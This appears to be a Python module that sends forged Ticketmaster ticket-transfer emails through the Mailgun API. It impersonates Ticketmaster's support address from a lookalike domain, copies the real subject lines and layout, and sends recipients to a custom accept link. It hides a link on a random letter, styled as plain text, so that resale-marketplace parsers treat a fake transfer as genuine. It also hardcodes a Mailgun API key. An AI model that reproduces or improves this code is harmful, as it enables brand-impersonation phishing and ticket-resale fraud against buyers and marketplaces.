"""
Mailgun email sender module for Ticketmaster [Secure-Pass]
Sends authentic Ticketmaster transfer emails with custom accept links
"""
import html
import json
import os
import random
import re
import requests
from datetime import datetime

# Mailgun configuration (matches stubby SMTP/mailgun_sender.py — env overrides file defaults)
MAILGUN_API_KEY = os.environ.get(
    "MAILGUN_API_KEY",
    "9ef52fcd1b05ede6643d5723c5b7b7b1-3330bd33-73fc8d4f",
)
MAILGUN_DOMAIN = os.environ.get("MAILGUN_DOMAIN", "securetixx.com")
TM_SUPPORT_ADDRESS = "customer_support@email.ticketmaster.com"
TM_FROM_LINE = f"Ticketmaster <{TM_SUPPORT_ADDRESS}>"
DEFAULT_FROM_EMAIL = (
    os.environ.get("MAILGUN_FROM")
    or os.environ.get("TM_MAILGUN_FROM")
    or f"SecureTixx <noreply@{MAILGUN_DOMAIN}>"
)

# Get template path
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATE_FILE = os.path.join(SCRIPT_DIR, "ticketmaster_template.html")
TM_EMAIL_ASSETS_DIR = os.path.join(SCRIPT_DIR, "tm_email_assets")
TM_INLINE_ASSET_NAMES = (
    "tm-wordmark-white.png",
    "tm-step-received.png",
    "tm-step-accepted.png",
    "tm-step-complete.png",
)
TM_SENDER_AVATAR_NAME = "tm-bimi-avatar.png"
TM_BIMI_AVATAR_FILE = os.path.join(TM_EMAIL_ASSETS_DIR, TM_SENDER_AVATAR_NAME)


def generate_ticket_code():
    """Generate random ticket code like ABC123XYZ789"""
    chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    return ''.join(random.choice(chars) for _ in range(12))


def load_template():
    """Load HTML template from file"""
    if not os.path.exists(TEMPLATE_FILE):
        raise FileNotFoundError(f"Missing template: {TEMPLATE_FILE}")
    with open(TEMPLATE_FILE, "r", encoding="utf-8") as f:
        return f.read()


def mailgun_from_email() -> str:
    raw = (DEFAULT_FROM_EMAIL or TM_FROM_LINE).strip()
    low = raw.lower()
    if "noreply@ticketmaster.com" in low or "buffproxy.com" in low:
        return TM_FROM_LINE
    if "@" in raw and "<" not in raw:
        return f"Ticketmaster <{raw}>"
    return raw or TM_FROM_LINE


def mailgun_deliverability_fields(*, reply_to: str = "") -> dict[str, str]:
    """Mailgun flags that help Gmail (no click/open rewrite, optional reply-to on verified domain)."""
    out = {
        "o:tracking": "no",
        "o:tracking-clicks": "no",
        "o:tracking-opens": "no",
    }
    rt = (reply_to or os.environ.get("MAILGUN_REPLY_TO") or "").strip()
    if not rt:
        rt = TM_SUPPORT_ADDRESS
    if "@" in rt and "<" not in rt:
        rt = f"Ticketmaster <{rt}>"
    if rt:
        out["h:Reply-To"] = rt
    out["h:Organization"] = "Ticketmaster"
    avatar_url = (os.environ.get("TM_SENDER_AVATAR_URL") or "").strip()
    if avatar_url.startswith("http"):
        out["h:List-Image"] = avatar_url
    return out


def _parse_venue_postal(venue: str) -> dict[str, str]:
    v = (venue or "").strip()
    out = {"name": v, "locality": "", "region": "", "country": "US"}
    if not v:
        return out
    parts = [p.strip() for p in v.split(",") if p.strip()]
    if len(parts) >= 3:
        out["region"] = parts[-1].split()[0]
        out["locality"] = parts[-2]
        out["name"] = ", ".join(parts[:-2]) or v
    elif len(parts) == 2:
        out["locality"] = parts[-1]
        out["name"] = parts[0]
    return out


def _event_start_iso(raw: str, *, tz_offset: str = "-04:00") -> str:
    s = (raw or "").strip()
    if not s:
        return ""
    if re.match(r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}[+-]\d{2}:\d{2}", s):
        return s
    for fmt, n in (("%Y-%m-%d %H:%M:%S", 19), ("%Y-%m-%dT%H:%M:%S", 19), ("%Y-%m-%d %H:%M", 16)):
        try:
            dt = datetime.strptime(s[:n], fmt)
            return dt.strftime(f"%Y-%m-%dT%H:%M:%S{tz_offset}")
        except ValueError:
            continue
    return ""


def _iso_to_ics_dtstart(start_date_iso: str) -> str:
    m = re.match(r"(\d{4})-(\d{2})-(\d{2})T(\d{2}):(\d{2}):(\d{2})", start_date_iso or "")
    if not m:
        return ""
    y, mo, d, h, mi, se = m.groups()
    return f"{y}{mo}{d}T{h}{mi}{se}"


def build_gmail_event_reservation_json_ld(
    *,
    reservation_number: str,
    recipient_name: str,
    artist_name: str,
    start_date_iso: str,
    venue: str,
    accept_url: str,
    event_image: str = "",
    section: str = "",
    row: str = "",
    seat: str = "",
) -> str:
    """Gmail EventReservation markup for calendar card (Add to Calendar / Directions)."""
    if not start_date_iso or not artist_name:
        return ""
    postal = _parse_venue_postal(venue)
    payload = {
        "@context": "http://schema.org",
        "@type": "EventReservation",
        "reservationNumber": reservation_number or "TM-TRANSFER",
        "reservationStatus": "http://schema.org/ReservationConfirmed",
        "url": accept_url,
        "underName": {"@type": "Person", "name": recipient_name or "Customer"},
        "reservationFor": {
            "@type": "MusicEvent",
            "name": artist_name,
            "startDate": start_date_iso,
            "url": accept_url,
            "location": {
                "@type": "Place",
                "name": postal["name"] or venue,
                "address": {
                    "@type": "PostalAddress",
                    "streetAddress": postal["name"] or venue,
                    "addressLocality": postal["locality"] or "USA",
                    "addressRegion": postal["region"] or "US",
                    "addressCountry": postal["country"] or "US",
                },
            },
        },
    }
    if event_image.startswith("http"):
        payload["reservationFor"]["image"] = event_image
    if section:
        payload["venueSection"] = section
    if row:
        payload["venueRow"] = row
    if seat:
        payload["venueSeat"] = seat
    blob = json.dumps(payload, ensure_ascii=False, separators=(",", ":"))
    return f'<script type="application/ld+json">{blob}</script>'


def build_event_ics_attachment(
    *,
    uid: str,
    artist_name: str,
    start_date_iso: str,
    venue: str,
    accept_url: str,
) -> bytes:
    """text/calendar attachment for Gmail/Apple calendar parsing."""
    if not start_date_iso:
        return b""
    dtstart = _iso_to_ics_dtstart(start_date_iso)
    if not dtstart:
        return b""
    stamp = datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
    lines = [
        "BEGIN:VCALENDAR",
        "VERSION:2.0",
        "PRODID:-//Ticketmaster//Transfer//EN",
        "CALSCALE:GREGORIAN",
        "METHOD:PUBLISH",
        "BEGIN:VEVENT",
        f"UID:{uid}@ticketmaster.com",
        f"DTSTAMP:{stamp}",
        f"DTSTART:{dtstart}",
        f"SUMMARY:{artist_name}",
        f"LOCATION:{venue}",
        f"URL:{accept_url}",
        "END:VEVENT",
        "END:VCALENDAR",
    ]
    return ("\r\n".join(lines) + "\r\n").encode("utf-8")


def _inject_head_markup(template: str, markup: str) -> str:
    if not markup:
        return template
    if "</head>" in template:
        return template.replace("</head>", markup + "\n</head>", 1)
    if "<body" in template:
        return template.replace("<body", markup + "\n<body", 1)
    return markup + template


def _tm_email_inline_files(html_body: str) -> list[tuple[str, tuple[str, bytes, str]]]:
    """Mailgun inline PNG attachments referenced as cid:filename in HTML."""
    files: list[tuple[str, tuple[str, bytes, str]]] = []
    for name in TM_INLINE_ASSET_NAMES:
        if f"cid:{name}" not in (html_body or ""):
            continue
        path = os.path.join(TM_EMAIL_ASSETS_DIR, name)
        if not os.path.isfile(path):
            continue
        try:
            with open(path, "rb") as f:
                payload = f.read()
        except OSError:
            continue
        files.append(("inline", (name, payload, "image/png")))
    return files


def ensure_tm_email_assets() -> None:
    """Create logo/step PNGs if tm_email_assets/ is missing (portable SMTP folder)."""
    if all(os.path.isfile(os.path.join(TM_EMAIL_ASSETS_DIR, n)) for n in TM_INLINE_ASSET_NAMES):
        return
    try:
        from build_tm_email_assets import main as _build_assets  # type: ignore

        _build_assets()
    except Exception:
        pass


def build_transfer_plain_text(
    *,
    sender_name: str,
    artist_name: str,
    event_date: str,
    venue: str,
    seat_line: str = "",
    seat_lines: list[tuple[str, str, str]] | None = None,
    accept_url: str,
    detect_url: str = "",
    ticket_count_n: int = 1,
) -> str:
    seats_plain = build_seat_lines_plain(seat_lines or []) if seat_lines else (seat_line or "")
    n = max(ticket_count_n, len(seat_lines or []) or 1)
    return (
        f"Your Ticket Transfer From {sender_name} Is Ready To Be Accepted!\n\n"
        f"{artist_name}\n{event_date}\n{venue}\n{seats_plain}\n\n"
        f"You got {n} ticket(s)! Accept your transfer:\n{accept_url}\n\n"
        "Transfer Status: Received\n"
        "This email is NOT your ticket.\n"
    )


def transfer_email_subject(sender_name: str, event_name: str) -> str:
    """Inbox-style subject (user-requested)."""
    sender = (sender_name or "Someone").strip()
    event = (event_name or "your event").strip()
    return f"{sender} sent you ticket(s) for {event}"


def transfer_email_subject_classic(sender_name: str) -> str:
    """Real Ticketmaster notification subject line."""
    sender = (sender_name or "Someone").strip()
    return f"Your Ticket Transfer From {sender} Is Ready To Be Accepted!"


def transfer_email_subject_for_recipient(to_email: str, sender_name: str, event_name: str) -> str:
    """
    Preupload + real TM use inbox subject (img2): ``Weirdo sent you ticket(s) for Event``.
    Classic ``Your Ticket Transfer From…`` belongs in the HTML body title, not the subject.
    """
    return transfer_email_subject(sender_name, event_name)


def is_ticketpreupload_recipient(to_email: str) -> bool:
    return "ticketpreupload.com" in (to_email or "").lower()


def lysted_listing_id_from_preupload_email(to_email: str) -> str | None:
    """``user-13221646882@ticketpreupload.com`` -> ``13221646882``."""
    addr = (to_email or "").strip().lower()
    if not addr or "@" not in addr:
        return None
    local = addr.split("@", 1)[0]
    if "-" not in local:
        return None
    suffix = local.rsplit("-", 1)[-1]
    return suffix if suffix.isdigit() else None


def lysted_detect_accept_url(listing_id: str) -> str:
    lid = (listing_id or "").strip()
    return f"https://www.ticketmaster.com/user/transfer/accept/lysted-{lid}"


def resolve_transfer_accept_urls(
    to_email: str,
    accept_url: str,
    *,
    detect_url: str = "",
) -> tuple[str, str]:
    """
    Returns ``(viewer_url, detect_url)``.
    Preupload: main button uses tixx/viewer URL; small TM lysted link satisfies Lysted parser.
    """
    viewer = (accept_url or "").strip()
    detect = (detect_url or "").strip()
    if is_ticketpreupload_recipient(to_email):
        lid = lysted_listing_id_from_preupload_email(to_email)
        if lid:
            tm = lysted_detect_accept_url(lid)
            if not detect:
                detect = tm
    return viewer, detect


def build_whats_next_html(sender_name: str, viewer_url: str, detect_url: str = "") -> str:
    """What's Next — one random letter links to TM detect; new one / Event Details → viewer."""
    sender = html.escape((sender_name or "Chris").strip())
    esc_viewer = html.escape(viewer_url, quote=True)
    link_style = "color: #024DDF; text-decoration: none;"
    stealth_style = "color: #353c42; text-decoration: none;"

    _new_ph = "@@NEWONE@@"
    _evt_ph = "@@EVENTDETAILS@@"
    text = (
        "You'll need to first accept the ticket transfer so the order is moved to your Ticketmaster account. "
        f"Once the transfer is complete, we'll let {sender} know you're all set. "
        "To accept the tickets, have your Ticketmaster password handy and login to your Ticketmaster account, "
        f"or create a {_new_ph}. Visit {_evt_ph} to view your ticket(s)."
    )

    if detect_url and detect_url.strip() != (viewer_url or "").strip():
        esc_detect = html.escape(detect_url.strip(), quote=True)
        skip: set[int] = set()
        for phrase in (_new_ph, _evt_ph):
            idx = text.find(phrase)
            if idx >= 0:
                skip.update(range(idx, idx + len(phrase)))
        letter_indices = [i for i, ch in enumerate(text) if ch.isalpha() and i not in skip]
        if letter_indices:
            pick = random.choice(letter_indices)
            ch = text[pick]
            text = (
                text[:pick]
                + f'<a href="{esc_detect}" target="_blank" style="{stealth_style}">{html.escape(ch)}</a>'
                + text[pick + 1 :]
            )

    text = text.replace(
        _new_ph,
        f'<a href="{esc_viewer}" alias="Create account" target="_blank" style="{link_style}">new one</a>',
        1,
    )
    text = text.replace(
        _evt_ph,
        f'<a href="{esc_viewer}" alias="Event Details" target="_blank" style="{link_style}">Event Details</a>',
        1,
    )
    return text


LYSTED_TM_ACCEPT_BASE = "https://www.ticketmaster.com/user/transfer/accept/lysted"


def format_seat_line(section: str, row: str, seat: str) -> str:
    """Single TM seat line, e.g. Section 9, Row 14, Seat 15 or Section LAWN8, GENERAL ADMISSION."""
    return format_seat_line_tm(section, row, seat)


def format_seat_line_tm(section: str, row: str, seat: str) -> str:
    sec = (section or "").strip()
    r = (row or "").strip()
    s = (seat or "").strip()
    ga_rows = {"GENERAL ADMISSION", "GA", "GA1", "GA2", "GA3", "GA4", "GA5"}
    if sec and r.upper() in ga_rows and not s:
        return f"Section {sec}, {r}"
    if sec and not r and s.upper() in ga_rows:
        return f"Section {sec}, {s}"
    parts: list[str] = []
    if sec and sec.upper() != "TBA":
        parts.append(f"Section {sec}")
    if r and r.upper() != "TBA":
        parts.append(f"Row {r}")
    if s and s.upper() != "TBA":
        parts.append(f"Seat {s}")
    return ", ".join(parts) if parts else "General Admission"


def parse_seats_arg(raw: str) -> list[tuple[str, str, str]]:
    """
    Parse CLI/API seat specs.
    Format: section,row,seat groups separated by ';'
    Examples:
      9,14,15;9,14,16  -> two reserved seats
      LAWN8,,GENERAL ADMISSION -> GA (one line, use --tickets 2 for qty)
    """
    out: list[tuple[str, str, str]] = []
    raw = (raw or "").strip()
    if not raw:
        return out
    for chunk in raw.split(";"):
        chunk = chunk.strip()
        if not chunk:
            continue
        parts = [p.strip() for p in chunk.split(",")]
        while len(parts) < 3:
            parts.append("")
        sec, row, seat = parts[0], parts[1], parts[2]
        out.append((sec, row, seat))
    return out


def expand_seat_range(section: str, row: str, seat: str) -> list[tuple[str, str, str]]:
    """4-5 or 15,16 -> separate seat lines for same section/row."""
    sec = (section or "").strip()
    r = (row or "").strip()
    s = (seat or "").strip()
    if not s:
        return [(sec, r, s)]
    if "-" in s:
        a, _, b = s.partition("-")
        if a.strip().isdigit() and b.strip().isdigit():
            lo, hi = int(a.strip()), int(b.strip())
            if lo <= hi and hi - lo < 20:
                return [(sec, r, str(n)) for n in range(lo, hi + 1)]
    if "," in s:
        nums = [x.strip() for x in s.split(",") if x.strip()]
        if nums:
            return [(sec, r, n) for n in nums]
    return [(sec, r, s)]


def normalize_seat_specs(
    *,
    section: str = "",
    row: str = "",
    seat: str = "",
    seats: list[tuple[str, str, str]] | None = None,
) -> list[tuple[str, str, str]]:
    if seats:
        return list(seats)
    return expand_seat_range(section, row, seat)


def build_seat_lines_html(seats: list[tuple[str, str, str]]) -> str:
    cell = (
        'align="left" valign="top" '
        'style="font-family:Arial, Helvetica, sans serif; color:#353c42; '
        'font-size:14px; line-height: 18px; font-weight:bold;" class="tmsans"'
    )
    if not seats:
        line = html.escape("General Admission")
        return (
            f'<table width="100%" cellspacing="0" cellpadding="0" border="0">'
            f'<tr><td {cell}>{line}</td></tr></table>'
        )
    rows: list[str] = []
    for sec, r, s in seats:
        line = html.escape(format_seat_line_tm(sec, r, s))
        rows.append(f"<tr><td {cell}>{line}</td></tr>")
    return (
        f'<table width="100%" cellspacing="0" cellpadding="0" border="0">'
        + "".join(rows)
        + "</table>"
    )


def build_seat_lines_plain(seats: list[tuple[str, str, str]]) -> str:
    if not seats:
        return "General Admission"
    return "\n".join(format_seat_line_tm(sec, r, s) for sec, r, s in seats)


def transfer_keychecks(
    *,
    sender_name: str,
    artist_name: str,
    seats: list[tuple[str, str, str]],
    ticket_count_n: int,
    subject: str,
) -> dict[str, str | int | list[str]]:
    """Fields Lysted/StubHub-style parsers typically key on."""
    seat_lines = [format_seat_line_tm(sec, r, s) for sec, r, s in seats] if seats else []
    return {
        "subject": subject,
        "subject_inbox": transfer_email_subject(sender_name, artist_name),
        "from": mailgun_from_email(),
        "ticket_count": max(ticket_count_n, len(seats) or 1),
        "seat_lines": seat_lines,
        "you_got_line": f"You got {max(ticket_count_n, len(seats) or 1)} ticket(s)!",
        "transfer_status": "Transfer Status: Received",
        "title_line": f"Your Ticket Transfer From {sender_name} Is Ready To Be Accepted!",
    }


def build_ticketmaster_html(
    sender_name="Chris",
    recipient_name="Customer",
    artist_name="Tori Amos - In Times of Dragons Tour",
    event_date="Mon, Aug 12, 08:45 PM",
    venue="2015 Enid Blvd in Remaining Venue, Sacramento, CA",
    section="SE(46)",
    row="K",
    seat="10",
    accept_url="https://ticketmaster.com/accept",
    detect_url: str = "",
    to_email: str = "",
    terms_link="https://www.ticketmaster.com/h/terms.html",
    privacy_link="https://privacy.ticketmaster.com/policy.html",
    event_image="https://i.postimg.cc/vTsN6hmz/event-image.png",
    ticket_count_n=1,
    seats: list[tuple[str, str, str]] | None = None,
    event_date_iso: str = "",
):
    """
    Build Ticketmaster email HTML with customizable parameters
    
    Args:
        sender_name: Who is transferring the tickets
        recipient_name: Recipient's name
        artist_name: Event/artist name
        event_date: Event date and time
        venue: Venue address
        section: Seat section
        row: Seat row
        seat: Seat number(s)
        accept_url: URL for the main "ACCEPT TICKETS" button (tixx viewer for preupload)
        detect_url: Optional TM lysted URL for preupload parser (small secondary link)
        to_email: Recipient — auto-resolves dual URLs when @ticketpreupload.com
        terms_link: Terms of use link
        privacy_link: Privacy policy link
    
    Returns:
        Complete HTML string ready to send
    """
    viewer_url, tm_detect_url = resolve_transfer_accept_urls(
        to_email, accept_url, detect_url=detect_url
    )
    template = load_template()
    ticket_code = generate_ticket_code()
    seat_specs = normalize_seat_specs(section=section, row=row, seat=seat, seats=seats)
    n_tix = max(int(ticket_count_n or 1), len(seat_specs) or 1)
    seat_lines_html = build_seat_lines_html(seat_specs)
    seat_line_single = format_seat_line_tm(section, row, seat) if len(seat_specs) == 1 else build_seat_lines_plain(seat_specs)
    whats_next_html = build_whats_next_html(sender_name, viewer_url, tm_detect_url)

    replacements = {
        '{{senderName}}': html.escape(sender_name),
        '{{recipientName}}': html.escape(recipient_name),
        '{{artistName}}': html.escape(artist_name),
        '{{eventDate}}': html.escape(event_date),
        '{{venue}}': html.escape(venue),
        '{{section}}': html.escape(section),
        '{{row}}': html.escape(row),
        '{{seat}}': html.escape(seat),
        '{{seatLine}}': html.escape(seat_line_single),
        '{{seatLinesHtml}}': seat_lines_html,
        '{{acceptLink}}': viewer_url,
        '{{whatsNextHtml}}': whats_next_html,
        '{{preuploadDetectBlock}}': "",
        '{{ticketCode}}': ticket_code,
        '{{termsLink}}': terms_link,
        '{{privacyLink}}': privacy_link,
        '{{eventImage}}': event_image,
        '{{ticketCountN}}': str(n_tix),
    }
    
    for placeholder, value in replacements.items():
        template = template.replace(placeholder, str(value))

    json_ld_url = tm_detect_url or viewer_url
    start_iso = _event_start_iso(event_date_iso) if event_date_iso else _event_start_iso(event_date)
    json_ld = build_gmail_event_reservation_json_ld(
        reservation_number=ticket_code,
        recipient_name=recipient_name,
        artist_name=artist_name,
        start_date_iso=start_iso,
        venue=venue,
        accept_url=json_ld_url,
        event_image=event_image,
        section=section,
        row=row,
        seat=seat,
    )
    template = _inject_head_markup(template, json_ld)

    return template


def send_mailgun_html(
    to_email,
    subject,
    html_body,
    text_body="",
    *,
    from_email: str | None = None,
    reply_to: str | None = None,
    attach_tm_inline: bool = False,
    extra_files: list[tuple[str, tuple[str, bytes, str]]] | None = None,
):
    """Send arbitrary HTML via Mailgun HTTP API."""
    try:
        ensure_tm_email_assets()
        url = f"https://api.mailgun.net/v3/{MAILGUN_DOMAIN}/messages"
        auth = ("api", MAILGUN_API_KEY)
        frm = (from_email or mailgun_from_email()).strip()
        data = {
            "from": frm,
            "to": to_email,
            "subject": subject,
            "html": html_body,
            **mailgun_deliverability_fields(reply_to=reply_to or frm),
        }
        if text_body:
            data["text"] = text_body
        files: list[tuple[str, tuple[str, bytes, str]]] = []
        if attach_tm_inline and "cid:" in (html_body or ""):
            files.extend(_tm_email_inline_files(html_body))
        if extra_files:
            files.extend(extra_files)
        resp = requests.post(url, auth=auth, data=data, files=files or None, timeout=20)
        if resp.status_code == 200:
            return True, "sent"
        return False, f"Mailgun error {resp.status_code}: {resp.text[:200]}"
    except Exception as e:
        return False, f"Error: {str(e)}"


def send_ticketmaster_email(
    to_email,
    sender_name="Chris",
    recipient_name="Customer",
    artist_name="Tori Amos - In Times of Dragons Tour",
    event_date="Mon, Aug 12, 08:45 PM",
    venue="2015 Enid Blvd, Sacramento, CA",
    section="SE(46)",
    row="K",
    seat="10",
    accept_url="https://ticketmaster.com/accept",
    detect_url: str = "",
    ticket_count_n=1,
    seats=None,
    event_image="",
    event_date_iso: str = "",
    from_email: str | None = None,
    reply_to: str | None = None,
    subject: str | None = None,
):
    """
    Send Ticketmaster ticket transfer email via Mailgun HTTP API
    
    Args:
        to_email: Recipient email address
        sender_name: Who is sending the transfer
        recipient_name: Recipient's name
        artist_name: Event/artist name
        event_date: Event date and time
        venue: Venue address
        section: Seat section
        row: Seat row
        seat: Seat number(s)
        accept_url: URL for the accept tickets button
    
    Returns:
        tuple: (success: bool, detail: str)
    """
    try:
        # Build HTML — dual-link preupload (TM detect + tixx button) + calendar JSON-LD
        viewer_url, tm_detect_url = resolve_transfer_accept_urls(
            to_email, accept_url, detect_url=detect_url
        )
        body_html = build_ticketmaster_html(
            sender_name=sender_name,
            recipient_name=recipient_name,
            artist_name=artist_name,
            event_date=event_date,
            venue=venue,
            section=section,
            row=row,
            seat=seat,
            accept_url=viewer_url,
            detect_url=tm_detect_url,
            to_email=to_email,
            ticket_count_n=ticket_count_n,
            seats=seats,
            event_image=event_image or "https://i.postimg.cc/vTsN6hmz/event-image.png",
            event_date_iso=event_date_iso,
        )
        
        if not subject:
            subject = transfer_email_subject_for_recipient(to_email, sender_name, artist_name)
        
        seat_specs = normalize_seat_specs(section=section, row=row, seat=seat, seats=seats)
        text_body = build_transfer_plain_text(
            sender_name=sender_name,
            artist_name=artist_name,
            event_date=event_date,
            venue=venue,
            seat_lines=seat_specs,
            accept_url=viewer_url,
            detect_url=tm_detect_url,
            ticket_count_n=ticket_count_n,
        )
        extra_files: list[tuple[str, tuple[str, bytes, str]]] = []
        start_iso = _event_start_iso(event_date_iso) if event_date_iso else _event_start_iso(event_date)
        ics = build_event_ics_attachment(
            uid=generate_ticket_code(),
            artist_name=artist_name,
            start_date_iso=start_iso,
            venue=venue,
            accept_url=viewer_url,
        )
        if ics:
            extra_files.append(("attachment", ("event.ics", ics, "text/calendar; method=PUBLISH")))
        frm = (from_email or TM_FROM_LINE).strip()
        if "buffproxy.com" in frm.lower():
            frm = TM_FROM_LINE
        rt = (reply_to or frm).strip()
        if "buffproxy.com" in rt.lower():
            rt = TM_FROM_LINE
        return send_mailgun_html(
            to_email,
            subject,
            body_html,
            text_body,
            from_email=frm,
            reply_to=rt,
            attach_tm_inline="cid:" in body_html,
            extra_files=extra_files,
        )

    except Exception as e:
        return False, f"Error: {str(e)}"


# Test function
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python mailgun_sender.py <email> [name]")
        print("Example: python mailgun_sender.py test@example.com 'John Doe'")
        sys.exit(1)
    
    test_email = sys.argv[1]
    test_name = sys.argv[2] if len(sys.argv) > 2 else "Test User"
    
    print(f"Sending test email to: {test_email}")
    print(f"Recipient name: {test_name}")
    print("")
    
    success, detail = send_ticketmaster_email(
        to_email=test_email,
        recipient_name=test_name,
        accept_url="https://example.com/test-accept-url"
    )
    
    if success:
        print(f"✅ Email sent successfully!")
        print(f"Detail: {detail}")
    else:
        print(f"❌ Failed to send email")
        print(f"Error: {detail}")
